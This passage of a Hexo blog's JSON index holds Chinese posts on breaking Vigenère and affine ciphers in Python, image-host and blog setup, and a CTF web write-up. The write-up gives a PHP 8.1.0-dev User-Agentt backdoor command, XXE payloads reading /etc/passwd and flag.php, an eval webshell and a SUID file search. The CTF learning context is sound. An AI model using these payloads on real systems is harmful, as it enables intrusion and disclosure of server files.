\n\t\t\tbreak\n\t\tcnt=0\n\t\tpi=0\n2.根据重合互指数得到密钥重合互指数：\n\n当两个子串的相对位移为0时其值为0.065，不为0则都在0.3~0.4左右，故我们可以把其中一子串设为标准英语，另一子串为根据密钥长度分组后的子串，爆破26种偏移，重合互指数最大的应该是子串相对标准英语的偏移，从而确定对应密钥字母。\n\n代码：\ndef getMI(str_1):\n#计算子串与标准英语之间的重合互指数\n\tZd_1=[0.082,0.015,0.028,0.043,0.127,0.022,0.020,0.061,0.070,0.002,0.008,0.040,0.024,0.067,0.075,0.019,0.001,0.060,0.063,0.091,0.028,0.010,0.023,0.001,0.020,0.001] #英语中a,b,c...z的频率\n\tZd_2=getCnt(str_1)\n\n\tmatrix_1=np.array(Zd_1)\n\tmatrix_2=np.array(list(Zd_2.values()))  #转成数组便于计算内积\n\n\n\tn2=np.sum(matrix_2)\n\tpi=matrix_2/n2\n\n\tHp=np.sum(pi*matrix_1)\n\n\treturn Hp\n\n\n\ndef KaiSa(key,string):\n#按需偏移字符串（凯撒加密）\n\tresult=''\n\tfor s in string:\n\t\tindex=Letters.find(s)\n\t\tresult=result+Letters[(index+key)%len(Letters)]\n\n\treturn result\n\ndef getListMI(num,group):\n#求出num号的子串的26种偏移下的重合互指数，并返回改组中最大互指数对应的偏移\n\tmm=0\n\tresult=[] #存放一组重合互指数\n\tfor i in range(0,len(Letters)):\n\t\tstring=KaiSa(i,group[num])\n\t\tx=getMI(string)\n\t\t#print(x)\n\t\tif x&gt;mm:\n\t\t\tmm=x\n\t\t\tkey=i\n\t\tresult.append(x)\n\n\treturn result,key\n\n\n\n\ndef getKey(message):\n#破解密钥\n\n\tkey_len=getLenKey(message)\n\n\n\tgroup=[] #按照密钥长度分组\n\th_key={} #存储偏移K\n\tMI={} #储存偏移值\n\tLetter_key=''#储存字母加密密钥\n\n\tfor i in range(key_len):    #按照密钥长度分组\n\t\tgroup.append(message[i::key_len])\n\t#print(group)\n\n\t\n\tfor i in range(0,key_len):  #求出每组的所有重合互指数和最大重合互指数对应的偏移\n\t\tMI[i],h_key[i]=getListMI(i,group)\n\n\t\n\tfor i in range(key_len):     #根据偏移写出密钥，因为偏移是相对密文的，而密钥则是相对明文的，故要用26-相对密文的偏移\n\t\tm=Letters[26-h_key[i]]\n\t\tLetter_key=Letter_key+m\n\n\treturn Letter_key\n3.已知密钥的维吉尼亚解密代码：\ndef decrypt(key,message):\n\n\tresult=''\n\tl=len(key)\n\tj=0\n\n\tfor i in message:\n\t\tindex=(Letters.find(i)-Letters.find(key[j]))%26\n\t\tj=(j+1)%l\n\t\tresult=result+Letters[index]\n\n\ttext=' '.join(wordninja.split(result))  #利用wordninja分词工具自动分词，增加明文可读性\n\n\treturn text\n4.完整代码及运行结果示例#维吉尼亚解密：不知道密钥情况下分析密钥，求出密文(适合长密文)\n#思路：1.求出密钥长度：方法可以用kasiski或者重合指数,这里用重合指数法\n#重合指数法思路：爆破key长度，将一组的子串计算重合指数p^2和(近似)，每一个子串重合指数都在0.065左右的则为真实密钥长度\n#2.破解密钥：根据重合互指数，爆破相对偏移\n#3.求解密文:已知密钥求密文\n\n'''\n表达难点：\n子串计算的处理==&gt;直接利用字符串自带的按步长分片\n重合指数的存储判断==&gt;方法一:计算平均值判断\n重合互指数需要将已满足条件的\n如何判断是约等于0.065\n'''\nimport numpy as np\nimport wordninja\n\nLetters=\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n\ndef getCnt(string):\n#统计字符出现的频率\n\tLettersZd={'A':0, 'B':0, 'C': 0, 'D': 0, 'E': 0, 'F': 0, 'G': 0, 'H': 0, 'I': 0, 'J': 0, 'K': 0, 'L': 0, 'M': 0, 'N': 0, 'O': 0, 'P': 0, 'Q': 0, 'R': 0, 'S': 0, 'T': 0, 'U': 0, 'V': 0, 'W': 0, 'X': 0, 'Y': 0, 'Z': 0}\n\tfor i in string:\n\t\tif i  in LettersZd:\n\t\t\tLettersZd[i]+=1\n\n\treturn LettersZd\n\ndef getIC(Zd):\n#计算重合指数\n\tfi=0\n\tn=0 #总数n\n\tfor k in Zd:\n\t\tfi=fi+Zd[k]*(Zd[k]-1)\n\t\tn=n+Zd[k]\n\n\tp=fi/(n*(n-1))\n\n\treturn p\n\n\ndef getLenKey(message):\n#得到密钥长度\n#方法：计算子串重合指数\n\tcnt=0\n\tpi=0\n\tfor i in range(1,len(Letters)):\n\t\t#print('key_length=%s'%i)\n\t\tfor j in range(1,i+1):\n\t\t\tstr=message[j::i]\n\t\t\tLettersZd=getCnt(str)\n\n\t\t\tpi=getIC(LettersZd)\n\t\t\t\n\t\t\tif pi&gt;0.055 and pi&lt;0.075:\n\t\t\t\tcnt+=1\n\t\tif cnt==i:\n\t\t\treturn i \n\t\t\tbreak\n\t\tcnt=0\n\t\tpi=0\n\n\ndef getMI(str_1):\n#计算子串与标准英语之间的重合互指数\n\tZd_1=[0.082,0.015,0.028,0.043,0.127,0.022,0.020,0.061,0.070,0.002,0.008,0.040,0.024,0.067,0.075,0.019,0.001,0.060,0.063,0.091,0.028,0.010,0.023,0.001,0.020,0.001] #英语中a,b,c...z的频率\n\tZd_2=getCnt(str_1)\n\n\tmatrix_1=np.array(Zd_1)\n\tmatrix_2=np.array(list(Zd_2.values()))  #转成数组便于计算内积\n\n\n\tn2=np.sum(matrix_2)\n\tpi=matrix_2/n2\n\n\tHp=np.sum(pi*matrix_1)\n\n\treturn Hp\n\n\n\ndef KaiSa(key,string):\n#按需偏移字符串（凯撒加密）\n\tresult=''\n\tfor s in string:\n\t\tindex=Letters.find(s)\n\t\tresult=result+Letters[(index+key)%len(Letters)]\n\n\treturn result\n\ndef getListMI(num,group):\n#求出num号的子串的26种偏移下的重合互指数，并返回改组中最大互指数对应的偏移\n\tmm=0\n\tresult=[] #存放一组重合互指数\n\tfor i in range(0,len(Letters)):\n\t\tstring=KaiSa(i,group[num])\n\t\tx=getMI(string)\n\t\t#print(x)\n\t\tif x&gt;mm:\n\t\t\tmm=x\n\t\t\tkey=i\n\t\tresult.append(x)\n\n\treturn result,key\n\n\n\n\ndef getKey(message):\n#破解密钥\n\n\tkey_len=getLenKey(message)\n\n\n\tgroup=[] #按照密钥长度分组\n\th_key={} #存储偏移K\n\tMI={} #储存偏移值\n\tLetter_key=''#储存字母加密密钥\n\n\tfor i in range(key_len):    #按照密钥长度分组\n\t\tgroup.append(message[i::key_len])\n\t#print(group)\n\n\t\n\tfor i in range(0,key_len):  #求出每组的所有重合互指数和最大重合互指数对应的偏移\n\t\tMI[i],h_key[i]=getListMI(i,group)\n\n\tfor i in range(key_len):     #根据偏移写出密钥，因为偏移是相对密文的，而密钥则是相对明文的，故要用26-相对密文的偏移\n\t\tm=Letters[(26-h_key[i])%26]\n\t\tLetter_key=Letter_key+m\n\n\treturn Letter_key\n\t\n\ndef decrypt(key,message):\n\n\tresult=''\n\tl=len(key)\n\tj=0\n\n\tfor i in message:\n\t\tindex=(Letters.find(i)-Letters.find(key[j]))%26\n\t\tj=(j+1)%l\n\t\tresult=result+Letters[index]\n\n\ttext=' '.join(wordninja.split(result))\n\n\treturn text\n\ndef main():\n\tmessage='krkpewxvftksopztecxvbuhfvycgxouflihoffptrcwffwhkcevxhiuzfposdvccyctpmjtbfymllctiwxtacsmjmoncwdnawjrwtjgjsuystvbxgvcmgczbqecllttfkjlacpfttjgeegtbvkfpmhjzqaxhvvpgxoeychrcwumchhyigixhqdciawunmjerefkekcozqttznfdjlopuyqhjgrjawcpfrgxhwiljgrgiycrqkiajfgvrlrxgkkghdbqnliaovzrltgafslacjvjexrwjrdzsvruprttfkwxfgrlstznnmjerdvjdlhkwwdngjfsawgjfunhitjcaykgrptzicibtwrcpycwbkxfibrqemivotvwdnotvldmvgicshbqkztmfqlzaxrqekntqefscmbqkfxguyzjaaorgccmcovrwxbckgdgonrqhxadcclbznjfdpzgegtgqawygxkgcjiasofqiecxvbdyageztjikvrxymqlapghcbcrtfgfdnhitjcaytqiknlsnwgrtbpfrlkwvvycraqicqnhpfrwbbizliasyfpawqqljslhqgktmccumgxmqlsemcvycsxovy'\n\tmessage=message.replace(\" \", \"\") #清除输入中的空格\n\t#print(message)\n\t#print(getLenKey(message))\n\ts=getKey(message.upper())\n\tprint('密钥为：%s'%s)\n\tt=decrypt(s,message.upper())\n\tprint('解密结果为：%s'%t)\n\n\n\nif __name__ == '__main__':\n\tmain()\n\n\n运行结果：\n\n2.3字典攻击代码：import detectEnglish,wordninja\n\nLetters=\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n\ndef decrypt(key,message):\n\n\tresult=''\n\tl=len(key)\n\tj=0\n\n\tfor i in message:\n\t\tif i in Letters:\n\t\t\tindex=(Letters.find(i)-Letters.find(key[j]))%26\n\t\t\tj=(j+1)%l\n\t\t\tresult=result+Letters[index]\n\t\telse:\n\t\t\tresult=result+i\n\n\ttext=' '.join(wordninja.split(result))\n\n\treturn text\n\n\ndef Hack(message):\n\n\tfo=open('dictionary.txt','r')\n\twords=fo.readlines()    #返回一个字符串列表，每个字符串是文件的一行\n\tfo.close()\n\n\t#开始爆破\n\tfor word in words:\n\t\tword=word.strip()\n\t\tst=decrypt(word,message)\n\n\t\t#message=message.replace(\" \", \"\") #清除输入中的空格\n\t\t#print(st)\n\t\tif detectEnglish.isEnglish(st,wordPercentage=40):\n\t\t\tprint(\"密钥可能为%s\"%word)\n\t\t\tprint(\"对应明文可能为%s\"%st)\n\n\ndef main():\n\tmessage='TzxisnzeccjxkgnfqlolmysbbqqIlxcz.'\n\tHack(message.upper())\n\nif __name__ == '__main__':\n\tmain()\ndetectEnglish.py# Detect English module\n# http://inventwithpython.com/hacking (BSD Licensed)\n\n# To use, type this code:\n#   import detectEnglish\n#   detectEnglish.isEnglish(someString) # returns True or False\n# (There must be a \"dictionary.txt\" file in this directory with all English\n# words in it, one word per line. You can download this from\n# http://invpy.com/dictionary.txt)\nUPPERLETTERS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nLETTERS_AND_SPACE = UPPERLETTERS + UPPERLETTERS.lower() + ' \\t\\n'\n\ndef loadDictionary():\n    dictionaryFile = open('dictionary.txt')\n    englishWords = {}\n    for word in dictionaryFile.read().split('\\n'):\n        englishWords[word] = None\n    dictionaryFile.close()\n    return englishWords\n\nENGLISH_WORDS = loadDictionary()\n\n\ndef getEnglishCount(message):\n    message = message.upper()\n    message = removeNonLetters(message)\n    possibleWords = message.split()\n\n    if possibleWords == []:\n        return 0.0 # no words at all, so return 0.0\n\n    matches = 0\n    for word in possibleWords:\n        if word in ENGLISH_WORDS:\n            matches += 1\n    return float(matches) / len(possibleWords)\n\n\ndef removeNonLetters(message):\n    lettersOnly = []\n    for symbol in message:\n        if symbol in LETTERS_AND_SPACE:\n            lettersOnly.append(symbol)\n    return ''.join(lettersOnly)\n\n\ndef isEnglish(message, wordPercentage=20, letterPercentage=85):\n    # By default, 20% of the words must exist in the dictionary file, and\n    # 85% of all the characters in the message must be letters or spaces\n    # (not punctuation or numbers).\n    wordsMatch = getEnglishCount(message) * 100 &gt;= wordPercentage\n    numLetters = len(removeNonLetters(message))\n    messageLettersPercentage = float(numLetters) / len(message) * 100\n    lettersMatch = messageLettersPercentage &gt;= letterPercentage\n    return wordsMatch and lettersMatch\n运行结果示例：\n","slug":"密码学编程之维吉尼亚解密","date":"2022-10-02T07:03:43.000Z","categories_index":"","tags_index":"密码学","author_index":"c1ongyan"},{"id":"d57c63b0ac830d2c732299e1855fc44f","title":"密码学编程之仿射解密","content":"密码学编程之仿射解密1.仿射加密简单来说就是把密文对应的的数字乘上密钥a再加上b模明文空间长度\n以26位大写字母为密文空间的加密表达式如下：\n\n2.破译仿射加密(以26位大写字母为密文空间为例)在已知密钥a和b的情况下可以很容易求出密文\n以26位大写字母为密文空间的解密表达式如下：\n\n在不知道密钥a和密钥b的情况下由于密钥空间小也很好爆破，因为为了保证能还原明文，必须要能够求出a的逆，这就要求a和26要互素，这样a只有12种可能，b有26种可能，总共12*26-1种可能，非常少，爆破很快。\n但要找出正确的一种可能用肉眼看太麻烦了，可以写一个判断是否是英文的脚本筛选一下，给出一个Al写的脚本detectEnglish.py：(注意需要有一个英文字典txt文件 dictionary.txt)\ndetectEnglish.py# Detect English module\n# http://inventwithpython.com/hacking (BSD Licensed)\n\n# To use, type this code:\n#   import detectEnglish\n#   detectEnglish.isEnglish(someString) # returns True or False\n# (There must be a \"dictionary.txt\" file in this directory with all English\n# words in it, one word per line. You can download this from\n# http://invpy.com/dictionary.txt)\nUPPERLETTERS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nLETTERS_AND_SPACE = UPPERLETTERS + UPPERLETTERS.lower() + ' \\t\\n'\n\ndef loadDictionary():\n    dictionaryFile = open('dictionary.txt')\n    englishWords = {}\n    for word in dictionaryFile.read().split('\\n'):\n        englishWords[word] = None\n    dictionaryFile.close()\n    return englishWords\n\nENGLISH_WORDS = loadDictionary()\n\n\ndef getEnglishCount(message):\n    message = message.upper()\n    message = removeNonLetters(message)\n    possibleWords = message.split()\n\n    if possibleWords == []:\n        return 0.0 # no words at all, so return 0.0\n\n    matches = 0\n    for word in possibleWords:\n        if word in ENGLISH_WORDS:\n            matches += 1\n    return float(matches) / len(possibleWords)\n\n\ndef removeNonLetters(message):\n    lettersOnly = []\n    for symbol in message:\n        if symbol in LETTERS_AND_SPACE:\n            lettersOnly.append(symbol)\n    return ''.join(lettersOnly)\n\n\ndef isEnglish(message, wordPercentage=20, letterPercentage=85):\n    # By default, 20% of the words must exist in the dictionary file, and\n    # 85% of all the characters in the message must be letters or spaces\n    # (not punctuation or numbers).\n    wordsMatch = getEnglishCount(message) * 100 &gt;= wordPercentage\n    numLetters = len(removeNonLetters(message))\n    messageLettersPercentage = float(numLetters) / len(message) * 100\n    lettersMatch = messageLettersPercentage &gt;= letterPercentage\n    return wordsMatch and lettersMatch\n这个脚本能帮我们淘汰掉很多种情况，但还是不能唯一得出密文，为了更好锁定密文，对于长文本来说可以引入词频分析，确定明文中E的正确位置(仿射加密本质是更简单的单表替换，出现频率最多的字符大概率就是E),帮助更好的判断出正确的明文\n最后的脚本如下(对长密文适用)：\nAffineHack.py#Affine Cipher Hacker\nimport math,sys,detectEnglish,wordninja\nfrom gmpy2 import invert\n\nenglishLetterFrea={'E':12.7,'T':9.06,'A':8.17,'O':7.51,'I':6.97,'N':6.75,'S':6.33,'H':6.09,'R':5.99,'D':4.25,'L':4.03,'C':2.78,'U':2.76,'M':2.41,'W':2.36,'F':2.23,'G':2.02,'Y':1.97,'P':1.93,'B':1.29,'V':0.98,'K':0.77,'J':0.15,'X':0.15,'Q':0.10,'Z':0.07}\n\n\nETAOIN='ETAOINSHRDLCUMWFGYPBVKJXQZ'  #英文中词频排列顺序（降序）\n\nSymbols='ABCDEFGHIJKLMNOPQRSTUVWXYZ'  #明文空间 密文空间\n\ndef getLetterCount(message):\n\n#统计字符串中每个字母的数量\n\tLetterCount={'A':0,'B':0,'C':0,'D':0,'E':0,'F':0,'G':0,'H':0,'I':0,'J':0,'K':0,'L':0,'M':0,'N':0,'O':0,'P':0,'Q':0,'R':0,'S':0,'T':0,'U':0,'V':0,'W':0,'X':0,'Y':0,'Z':0}\n\n\tfor i in message.upper():\n\t\tif i in Symbols:\n\t\t\tLetterCount[i]+=1\n\t\n\treturn LetterCount\n\n\n\ndef getItemAtIndexZero(x):\n#返回变量的下标为0的值\n\treturn x[0]\n\ndef getFrequencyOrder(message):\n#按照字母出现的次数排序\n\tletterToFreq=getLetterCount(message) #字母到次数的映射\n\tfreqToLetter={} #次数到字母的映射\n\n\tfor i in Symbols:          \n\t\tif letterToFreq[i] not in freqToLetter:   #判断字母对应次数是否是字典freqToLetter的键，若不是则以该次数为键，以对于的字母为值；若是，则在最后追加一组键值对\n\t\t\tfreqToLetter[letterToFreq[i]]=[i]     #因为次数可能出现相同的情况\n\t\telse:\n\t\t\tfreqToLetter[letterToFreq[i]].append(i)\n\n\tfor freq in freqToLetter:\n\t\tfreqToLetter[freq].sort(key=ETAOIN.find,reverse=True)  #将同一次数的键所对应的字母按照ETAOIN的降序排列(做一个约定)\n\t\tfreqToLetter[freq]=''.join(freqToLetter[freq])\n\n\tfreqPairs=list(freqToLetter.items())                 #将字典变成一个元组列表\n\tfreqPairs.sort(key=getItemAtIndexZero,reverse=True)  #按照元组列表索引为0的值排序\n\n\treturn freqPairs\n\n\n\n\ndef getKey(key):\n\t#得到两个ab密钥\n\tkey_a=key//len(Symbols)\n\tkey_b=key%len(Symbols)\n\treturn (key_a,key_b)\n\ndef checkKeys(key_a,key_b,mode):\n\t#检查密钥是否合法\n\tif mode=='encrypt':\n\t\tif key_a==1 or key_b==1:\n\t\t\tsys.exit('太简单')\n\tif key_a&lt;0 or key_b&lt;0 or key_b&gt;len(Symbols)-1:\n\t\tsys.exit('不属于区间(0,len(Symbols))')\n\tif math.gcd(key_a,len(Symbols))!=1:\n\t\tsys.exit('密钥a和模数不互素')\n\ndef decryptM(key,message):\n\t#已知密钥的仿射解密\n\tK1,K2=getKey(key)\n\tcheckKeys(K1,K2,'decrypt')\n\tresult=''\n\tmodInverseOfKeya=invert(K1,len(Symbols))    #求密钥a的模逆元\n\n\tfor i in message:\n\t\tif i in Symbols:\n\t\t\tIndex=Symbols.find(i)\n\t\t\tresult+=Symbols[((Index-K2)*modInverseOfKeya)%len(Symbols)]\n\t\telse:\n\t\t\tresult+=i\n\n\treturn result\n\ndef hackAffine(message):  \n#爆破得到明文\n\tcnt=0 #最后输出的可能解密结果数\n\n\tMax=getFrequencyOrder(message)[0][1]\n\n\tfor i in message:\n\t\tif i==Max:\n\t\t\tind = message.find(i)   #找到E所在的位置\n\t\t\tbreak\n#                  \n\tprint('hacking start')\n\n\tfor key in range(len(Symbols)**2):   #爆破密钥\n\t\tkey_a=getKey(key)[0]\n\t\tif math.gcd(key_a,len(Symbols))!=1:  #密钥a要和模数互素\n\t\t\tcontinue\n\n\t\tresult=decryptM(key,message)  #将密钥带入根据公式求出对应明文\n\n\t\tif result[ind]=='E':\n\t\t\t#print('tried key %s...(%s)'%(key,result[:20]))\n\t\t\ttext=' '.join(wordninja.split(result))  #利用wordninja工具给字符串分词，这样才能用detectEnglish判断是否是英文\n\t\t\tif detectEnglish.isEnglish(text):    #利用detectEnglish判断是否是英文\n\t\t\t\tcnt+=1\n\t\t\t\tprint('possible encryption hack:')\n\t\t\t\tprint('key:%s'%(key))\n\t\t\t\tprint('c:'+result[:50])\n\t\t\t\tprint(text)                      #输出最后可能结果\n\treturn cnt\n\ndef main():\n\tMessage='FMXVEDKAPHFERBNDKRXRSREFMORUDSDKDVSHVUFEDKAPRKDLYEVLRHHRH'  # 输入密文\n\n\tHackedM=hackAffine(Message)\n\n\tif HackedM!=0:           #如果最后测得的可能解不为0，则成功解密\n\t\tprint('Success')\n\telse:\n\t\tprint('Failed')\n\nif __name__=='__main__':\n\tmain()\n\n3.运行示例\n","slug":"密码学编程之仿射解密","date":"2022-09-24T02:54:54.000Z","categories_index":"","tags_index":"密码学","author_index":"c1ongyan"},{"id":"ce37acc016e9206d79635834f119399c","title":"typora+picgo+github图床搭建","content":"typora+picgo+github 图床搭建及常见问题解决方式1.创建GitHub账号GitHub网址：\nhttps://github.com/\n2.创建仓库\n\n3.获取token进入设置\n\n\n进入developer setting\n\n\n注意repo一定要选择\n获取token，记得复制，只显示一次\n4.下载安装picgo下载地址：https://github.com/Molunerfinn/PicGo/releases/tag/v2.3.0\nWindows选择如下图的文件\n\n下载后安装\n5.配置github图床（注意安装好后点击桌面Picgo图标没有应用界面，需要再点击右下角的工具栏里的相应图标）\n按照如图所示进行配置\n\n在picgo设置中开启时间戳重命名，防止出现上传同名文件的422报错\n\n6.配置typora打开typora —》选择文件—》选择偏好设置—》选择图像\n按照下列设置，最后验证图片上传选项\n\n最后显示如下图则成功\n\n7.常见问题1.最后验证图片无法上传成功：upload error查看日志：404 可能是配置picgo的时候用户名，仓库名等其他配置写错，仔细检查一遍\n查看日志：422 是上传同名文件的报错，在picgo设置中开启时间戳重命名设置可避免\n2.验证成功上传但是在typora无法查看图片2.1修改hosts文件：利用记事本打开：C:\\Windows\\System32\\drivers\\etc\\hosts （以管理员身份打开记事本，在记事本中打开文件，记得选择全部文件，不然没有显示）\n添加如下的内容到hosts中\n# GitHub Start \n140.82.113.3      github.com\n140.82.114.20     gist.github.com\n151.101.184.133    assets-cdn.github.com\n151.101.184.133    raw.githubusercontent.com\n151.101.184.133    gist.githubusercontent.com\n151.101.184.133    cloud.githubusercontent.com\n151.101.184.133    camo.githubusercontent.com\n151.101.184.133    avatars0.githubusercontent.com\n199.232.68.133     avatars0.githubusercontent.com\n199.232.28.133     avatars1.githubusercontent.com\n151.101.184.133    avatars1.githubusercontent.com\n151.101.184.133    avatars2.githubusercontent.com\n199.232.28.133     avatars2.githubusercontent.com\n151.101.184.133    avatars3.githubusercontent.com\n199.232.68.133     avatars3.githubusercontent.com\n151.101.184.133    avatars4.githubusercontent.com\n199.232.68.133     avatars4.githubusercontent.com\n151.101.184.133    avatars5.githubusercontent.com\n199.232.68.133     avatars5.githubusercontent.com\n151.101.184.133    avatars6.githubusercontent.com\n199.232.68.133     avatars6.githubusercontent.com\n151.101.184.133    avatars7.githubusercontent.com\n199.232.68.133     avatars7.githubusercontent.com\n151.101.184.133    avatars8.githubusercontent.com\n199.232.68.133     avatars8.githubusercontent.com\n185.199.111.133    raw.githubusercontent.com \n185.199.110.133    raw.githubusercontent.com \n185.199.108.133    raw.githubusercontent.com \n185.199.109.133    raw.githubusercontent.com \n# GitHub End\n2.2检查配置是否写错我在遇到这些问题的时候很多时候都是配置写错了的问题\n2.3重启最后解决不了就重启一遍软件，还是在picgo相册中不显示（前面的不会显示，每次都再重新验证一遍），就重装picgo(我只重启过，看别的博主说可以通过重装解决)\n","slug":"typora-picgo-github图床搭建","date":"2022-07-28T15:04:49.000Z","categories_index":"","tags_index":"PicGo","author_index":"c1ongyan"},{"id":"ce9156f0e3c852946bbfbbd9e0a335db","title":"我的第一篇文章","content":"","slug":"我的第一篇文章","date":"2022-07-27T17:43:26.000Z","categories_index":"","tags_index":"","author_index":"c1ongyan"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\nMore info: Writing\nRun server$ hexo server\nMore info: Server\nGenerate static files$ hexo generate\nMore info: Generating\nDeploy to remote sites$ hexo deploy\nMore info: Deployment\n","slug":"hello-world","date":"2022-07-27T17:32:29.616Z","categories_index":"","tags_index":"","author_index":"c1ongyan"},{"id":"a4fcadc1e196e641ac57395fa50aecae","title":"20210601cumtctf","content":"0x01web签到\n查看题目，看到“I’m the best language in the world！！！”。联想到php是世界上最好的语言，所有这题肯定和php有关。因为之前有入门赛出过类似的谜语题，当时post bxs=什么什么就出flag了，还以为这题也一样，结果传了好一会没用，后来抓包试试，查看返回包。\n\n发现php版本信息，版本为php/8.1.0-dev，该版本可能存在后门。\nphp/8.1.0-dev后门漏洞\n可以通过发送User-Agentt头来执行任意代码。\n示例：\n\n添加User-Agentt:zerodiumvar_dump(2*3);发现代码被执行；接着请求User-Agentt:zerodiumsystem(&quot;cat flag.php&quot;); 或者User-Agentt:zerodiumshow_source(&quot;flag.php&quot;); 查看flag.php。\n\n拿到flag\ntips：大佬说谜语题一般是找备份文件，挨个网页看源代码，看返回响应头\n0x02别大Exxe漏洞\n参考文章：https://blog.csdn.net/zxpo/article/details/4020701（示例明显能看到实体的作用）\nhttps://xz.aliyun.com/t/3357（xxe漏洞/xml基础知识）\nhttps://blog.csdn.net/qq_45521281/article/details/106112654一道典型的xxe ctf，和此题差不多。\n回到此题\n\n抓包，post传payload：\n&lt;!DOCTYPE ANY [\n    &lt;!ENTITY test SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;  &#x2F;&#x2F;实体定义+读取敏感文件\n]&gt;\n&lt;user&gt;&lt;username&gt;&amp;test;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;\n\n能够读到敏感信息，试着读取flag所在文件，一般flag在flagphp,flag.txt等等。\n这题可查看页面源代码\n\n\n尝试访问aGludHR0.php，知道了flag在flag.php中\n\n构建payload，读取flag.php\n&lt;!DOCTYPE ANY [\n    &lt;!ENTITY test SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;&gt;\n]&gt;\n&lt;user&gt;&lt;username&gt;&amp;test;&lt;&#x2F;username&gt;&lt;password&gt;0&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;\nbase64解码就行\n0x03get shell这题就写一下看学长做的一种方法吧，其它的暂时不会。\n用到的工具：\nphp混淆类代码解密在线网站：https://www.zhaoyuanma.com/phpjm.html，蚁剑。\n看题\n\n放在解码网站里解得\n&lt;?php\nhighlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);\n@eval($_POST[ymlisisisiook]);\n?&gt;\n可见是一句话木马，查看phpinfo.php，发现有些函数被禁了\n\n其中包括system等，能够进行命令执行的函数被禁。上蚁剑绕过disable_functions。\n密码为ymlisisisiook\n上插件，成功后编辑数据，网址后面加上.antproxy.php,密码不变\n\n\n这时候就发现能访问到上级目录了\n\n发现flag文件，但点进去没有，说明还没有权限\n用suid命令find / -perm -u=s -type f 2&gt;/dev/null查找有权限查看文件的命令，发现有cat，然后查看/flag即可。\n\n","slug":"20210601cumtctf","date":"2021-06-03T00:40:49.000Z","categories_index":"","tags_index":"ctf,web,blog","author_index":"c1ongyan"},{"id":"7952d81635b98b1977490228ae08b9c9","title":"搭建博客中遇到的问题","content":"1.在hexo clean+hexo g+hexo d三步后出现404页面​     其实只是少做了一步操作，就是在github的setting（翻到底层）在github page中的custom domian中输入自己的域名即可，每次进行hexo clean操作后都要重复该操作，不过也可能是因为我绑定了属于自己的域名的缘故。\n2.在hexo clean时或者hexo g时出现指向冒号的报错​     一般出现这种错误是因为冒号后面没有打空格，但是确实后面打空格了，但还是报错，最终无法再删掉了blog文件，再来一次就ok了。\n3.域名绑定​     看了各种教程，其实只需要搞定两个地方就行，一是在域名解析器中加入CANEM记录，前面一格填@即可，填@域名为xindewin.cn;www则为www.xindewin.cn  ；二是在github page中的custom domian中输入自己的域名即可。会有一小会的延迟，不要着急。记得域名要实名，不然也是不成功的。\n4.hexo g部署文章时报错 err: YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line 4, column 1:（空行）\n  其实这个问题line 4多了一排空行，不要纠结at\\node_modules\\hexo-front-matter\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js之类的文字。\n5访问页面出现extends includes/layout.pug block content include includes/recent-posts.pug include includes/partial在git bash中输入npm install --save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive\n再\nhexo clean\nhexo g\nhexo s\nhexo d\n还没下载图片插件，第一篇blog写得比较简陋，不过也是一个好的开始，希望之后能耐心写下更多的学习或者经验内容，也很感谢azuki，在我网络搜寻无果解决不了问题的时候给予了我许多帮助，而且博客一开始也是他花时间带我下的，不然我一个小白也不知道还可以写博客，哈哈。\n","slug":"搭建博客中遇到的问题","date":"2021-03-15T08:13:32.000Z","categories_index":"","tags_index":"blog,hexo","author_index":"c1ongyan"}]